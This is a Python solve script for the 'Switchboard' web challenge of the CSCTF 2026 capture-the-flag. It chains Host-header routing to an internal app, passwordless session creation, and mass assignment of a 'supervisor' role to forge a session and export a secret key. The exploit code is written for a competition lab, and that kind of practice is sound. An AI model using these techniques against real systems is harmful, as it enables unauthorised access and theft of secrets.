#!/usr/bin/env python3
"""
Switchboard (web/easy) - CSCTF 2026 "Total Warfare"

Chain:
  1. The public line-status board's JS base64-decodes the internal exchange
     controller's hostname (exch-ctl.vjod.internal) for display only - the
     browser "can't reach it", but the backend is a single server that routes
     by the Host header, so sending that Host string to the SAME host:port
     reaches the internal "Exchange controller" app directly (SSRF via
     Host-header-based virtual hosting).
  2. POST /auth {"username": "<anything>"} opens a session cookie with
     role=operator, no real authentication required ("sessions opened from
     inside the exchange network do not ask for a password").
  3. The /auth handler performs mass assignment: it also accepts a "role"
     field straight from the client and bakes it into the signed session
     cookie unchanged, so POST /auth {"username": "x", "role": "supervisor"}
     mints a supervisor session for free.
  4. GET /export/trunk-key with that cookie requires only role=supervisor
     and returns the trunk crypto key, which contains the flag.

Usage:
    python3 solve.py [base_url] [controller_host]
"""
import sys
import json
import urllib.request

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://w06.ctf.chronos-security.ro:34144"
CONTROLLER_HOST = sys.argv[2] if len(sys.argv) > 2 else "exch-ctl.vjod.internal"


def request(path, method="GET", body=None, cookie=None):
    headers = {"Host": CONTROLLER_HOST}
    data = None
    if body is not None:
        data = json.dumps(body).encode()
        headers["Content-Type"] = "application/json"
    if cookie:
        headers["Cookie"] = cookie
    req = urllib.request.Request(BASE_URL + path, data=data, headers=headers, method=method)
    with urllib.request.urlopen(req) as resp:
        set_cookie = resp.headers.get("Set-Cookie")
        payload = json.loads(resp.read())
        return payload, set_cookie


def main():
    print(f"[+] Reaching internal controller via Host: {CONTROLLER_HOST}")

    # Step 1: trivial session, role baked in client-side (mass assignment)
    payload, set_cookie = request(
        "/auth", method="POST", body={"username": "ctf-player", "role": "supervisor"}
    )
    print(f"[+] POST /auth -> {payload}")
    cookie = set_cookie.split(";", 1)[0]
    print(f"[+] Session cookie: {cookie}")

    # Step 2: export the trunk key with the forged supervisor session
    key_payload, _ = request("/export/trunk-key", cookie=cookie)
    print(f"[+] GET /export/trunk-key -> {json.dumps(key_payload, indent=2)}")
    print(f"[+] Flag: {key_payload['trunk_key']}")


if __name__ == "__main__":
    main()
